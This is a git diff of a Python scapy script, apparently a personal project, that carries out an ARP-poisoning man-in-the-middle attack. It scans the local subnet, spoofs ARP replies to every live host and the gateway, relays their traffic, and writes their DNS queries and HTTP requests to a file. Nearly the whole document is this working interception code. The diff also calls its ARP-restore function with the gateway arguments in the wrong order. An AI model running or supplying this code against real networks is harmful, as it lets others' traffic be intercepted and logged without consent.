@@ -7,10 +7,9 @@ import ipaddress
 import netifaces
 from scapy.all import ARP, Ether, IP, DNS, HTTPRequest, srp, sendp, sniff
 import time
-import datetime
 import threading
-import argparse
 import sys
+from datetime import datetime
 
 def get_subnet():
     # Retrieve the default network interface's IPv4 info
@@ -93,16 +92,10 @@ def poison_gateway(live_hosts, real_gateway_ip, attacker_mac, interval=10, durat
         print("\nGateway poisoning stopped.")
 
 
-def forward_packets(real_gateway_mac, live_hosts):
-    print("Starting packet forwarding...")
-    try:
-        sniff(filter="ip", prn=lambda packet: forward_traffic(packet, real_gateway_mac, live_hosts), store=False)
-    except KeyboardInterrupt:
-        print("\nPacket forwarding stopped.")
-
-
 # Forward traffic between the host and gateway
-def forward_traffic(packet):
+def process_packet(packet, real_gateway_mac, live_hosts, attacker_mac, real_gateway_ip):
+    
+    #Forward traffic
     host_mac_map = {host_ip: host_mac for host_ip, host_mac in live_hosts}
     if IP in packet:
         # Packet going to the gateway
@@ -118,18 +111,8 @@ def forward_traffic(packet):
                 packet[Ether].src = attacker_mac  # Source MAC is attacker
                 packet[Ether].dst = target_mac  # Destination MAC is the real MAC of the host
                 sendp(packet, verbose=False)
-
-
-def intercept_traffic():
-    protocol = input("Choose a protocol to filter (dns, http): ").lower()      # Need to fix this...just gonna hard code http and dns I think
-    filter_expr = {
-        'http': 'tcp port 80',
-        'dns': 'udp port 53'
-    }.get(protocol, protocol)
     
-    sniff(filter=filter_expr, prn=store_captured_traffic)
-
-def store_captured_traffic(packet):
+    # Capture DNS/HTTP
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # Only queries, not responses
         query = packet[DNS].qd.qname.decode('utf-8')
         src_ip = packet[IP].src
@@ -151,38 +134,49 @@ def store_captured_traffic(packet):
             file.write(f"{request_line}\n")
             file.write(f"Host: {host}\n\n")
 
+def start_mitm_attack(real_gateway_mac, live_hosts, attacker_mac, real_gateway_ip):
+    print("Starting Man in the Middle Attack and packet capture...")
+    filter_expr = 'ip or (tcp port 80 or udp port 53)'
+    sniff(filter=filter_expr, prn=lambda packet: process_packet(packet, real_gateway_mac, live_hosts, attacker_mac, real_gateway_ip), store=False)
 
-# Main function
+
+def restore_arp_tables(live_hosts, real_gateway_mac, real_gateway_ip):
+    print("Restoring ARP tables")
+    for ip, mac in live_hosts:
+        # Tell hosts real gateway mac
+        sendp(Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=real_gateway_ip, hwsrc=real_gateway_mac))
+        #Tell gateway real host mac
+        sendp(Ether(dst=real_gateway_mac) / ARP(op=2, pdst=real_gateway_ip, hwdst=real_gateway_mac, psrc=ip, hwsrc=mac))
+
+
 if __name__ == "__main__":
-    subnet = get_subnet()
-    live_hosts = scan_subnet(subnet)
-    
-    
-    attacker_mac, attacker_ipv4 = discover_attacker_info()
+    try:
+        subnet = get_subnet()
+        live_hosts = scan_subnet(subnet)
+        attacker_mac, attacker_ipv4 = discover_attacker_info()
+        real_gateway_ip, real_gateway_mac = discover_gateway(live_hosts)
 
-    # Get both the gateway IP and MAC
-    real_gateway_ip, real_gateway_mac = discover_gateway(live_hosts)
+        # Start poisoning threads
+        host_thread = threading.Thread(target=poison_hosts, args=(live_hosts, real_gateway_ip, attacker_mac, 10, None))
+        gateway_thread = threading.Thread(target=poison_gateway, args=(live_hosts, real_gateway_ip, attacker_mac, 10, None))
+        host_thread.start()
+        gateway_thread.start()
 
-    # Start poisoning threads
-    host_thread = threading.Thread(target=poison_hosts, args=(live_hosts, real_gateway_ip, attacker_mac, 10, None))
-    gateway_thread = threading.Thread(target=poison_gateway, args=(live_hosts, real_gateway_ip, attacker_mac, 10, None))
-    host_thread.start()
-    gateway_thread.start()
+        start_mitm_attack(real_gateway_mac, live_hosts, attacker_mac, real_gateway_ip)
 
-    # Start forwarding packets
-    forward_packets(real_gateway_mac, live_hosts)
-
-    # Capture packets
-    intercept_traffic()
-    store_captured_traffic()
-
-    # Clean up / Restore ARP tables
+    except KeyboardInterrupt:
+        print("\nReceived interrupt, cleaning up...")
+        restore_arp_tables(live_hosts, real_gateway_ip, real_gateway_mac)
+        host_thread.join()
+        gateway_thread.join()
+        sys.exit(0)
+ 
 
 '''
 
 NEEDS:
 1. Input validation for: choosing an IP to grab, or a range of IPs, versus just a subnet
-2. Input validation: choosing http or dns to capture.
+2. Input validation: choosing http or dns to capture. Put it in argparse at CLI and alsop filter it accordingly in 
 2. Restoring the correct arp table mappings
 
 FUTURE ENHANCEMENTS:
@@ -226,5 +220,7 @@ if __name__ == "__main__":
     }.get(protocol, protocol)
     
     sniff(filter=filter_expr, prn=store_captured_traffic)
+
+    will need to re-import argparse and sys
 
 '''
